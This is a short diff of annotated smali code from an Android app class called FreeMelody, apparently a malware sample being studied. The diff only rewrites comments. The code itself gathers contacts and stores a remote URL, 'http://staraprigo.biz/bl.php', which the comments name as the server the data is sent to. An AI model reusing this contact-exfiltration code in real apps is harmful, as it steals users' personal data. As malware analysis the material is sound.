@@ -53,13 +53,11 @@
     ###appends contacts onto string in v0 instance, referenced by p0###
 
     .line 35
+#Creates string variable in v0, puts object in FreeMelody.url
+#This is the remote server the data will be sent to.
     const-string v0, "http://staraprigo.biz/bl.php" 
-
-    #Adds string URL to queue in v0, this is the server it will send the data to.###
-
     iput-object v0, p0, Lcom/mmmm/bl/FreeMelody;->url:Ljava/lang/String; 
 
-    ###appends url to string in v0 p0###
 
     .line 36
     const/4 v0, 0x0 
